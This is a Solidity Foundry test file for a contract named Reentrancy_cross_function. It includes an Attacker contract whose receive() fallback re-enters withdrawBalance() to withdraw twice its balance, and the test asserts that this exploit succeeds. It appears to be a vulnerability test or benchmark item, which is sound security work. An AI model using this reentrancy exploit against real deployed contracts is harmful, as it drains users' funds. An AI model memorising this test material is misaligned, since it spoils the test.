
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_cross_function} from "../src/Reentrancy_cross_function.sol";

contract TestReentrancy_cross_function is Test {

    Reentrancy_cross_function public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_cross_function();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));
        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_cross_function public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        _victim = Reentrancy_cross_function(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        _victim.withdrawBalance();

        uint256 received = address(this).balance - initialSnapshot;
        if (attackCallCount > 1 && received == 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.withdrawBalance();
            attackCallCount++;
        }
    }
}
